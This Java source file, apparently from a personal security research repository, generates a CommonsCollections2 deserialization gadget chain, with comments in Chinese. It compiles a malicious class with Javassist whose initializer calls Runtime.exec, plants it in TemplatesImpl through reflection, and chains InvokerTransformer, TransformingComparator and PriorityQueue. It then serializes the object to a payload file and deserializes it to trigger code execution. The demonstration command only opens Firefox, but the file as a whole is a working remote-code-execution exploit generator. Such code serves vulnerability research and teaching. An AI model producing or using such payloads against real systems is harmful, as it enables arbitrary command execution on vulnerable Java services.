package com.sec.exploits.CommonsCollections.CommonsCollections2;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassClassPath;
import javassist.ClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * @program: Gadgets
 * @description:
 * @author: 0range
 * @create: 2021-05-14 15:05
 **/


public class TemplatesImpl_Exploit {
    public static void main(String[] args) throws Exception {
        //1.先创建恶意类
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass tempExploitClass = pool.makeClass("3xpl01t");
        //一定要设置父类，为了后续顺利
        tempExploitClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        //写入payload，生成字节数组
        String cmd = "java.lang.Runtime.getRuntime().exec(\"open /Applications/Firefox.app\");";
        tempExploitClass.makeClassInitializer().insertBefore(cmd);
        byte[] exploitBytes = tempExploitClass.toBytecode();

        //2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件
        TemplatesImpl tmpl = new TemplatesImpl();
        //设置_bytecodes属性为exploitBytes
        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(tmpl, new byte[][]{exploitBytes});
        //一定要设置_name不为空
        Field _name = TemplatesImpl.class.getDeclaredField("_name");
        _name.setAccessible(true);
        _name.set(tmpl, "0range");
        //_class为空
        Field _class = TemplatesImpl.class.getDeclaredField("_class");
        _class.setAccessible(true);
        _class.set(tmpl, null);

        //3.开始做InvokerTransformer 命名为iInvokerTransformer，需要借助它内部的invoke方法调用newTransformer方法
        //然后用TransformingComparator包装他，因为TransformingComparator的构造函数可以把iInvokerTransformer传递给自身transformer属性
        InvokerTransformer iInvokerTransformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
        TransformingComparator iTransformingComparator = new TransformingComparator(iInvokerTransformer);

        //4.开始new一个 PriorityQueue，因为他的readObject方法是一切的开始
        PriorityQueue pq = new PriorityQueue(2);

        Object[] queueArray = new Object[]{tmpl, 2};

        //解封属性comparator, iTransformingComparator => _comparator
        Field _comparator = PriorityQueue.class.getDeclaredField("comparator");
        _comparator.setAccessible(true);
        _comparator.set(pq, iTransformingComparator);
        //解封属性queue，queueArray => _queue
        Field _queue = PriorityQueue.class.getDeclaredField("queue");
        _queue.setAccessible(true);
        _queue.set(pq, queueArray);
        //size修改为2
        Field _size = Class.forName("java.util.PriorityQueue").getDeclaredField("size");
        _size.setAccessible(true);
        _size.set(pq, 2);


        try {
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty("user.dir") + "/src/main/resources/Payload_cc2_TemplatesImpl.ser")));
            outputStream.writeObject(pq);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(new File(System.getProperty("user.dir") + "/src/main/resources/Payload_cc2_TemplatesImpl.ser")));
            inputStream.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
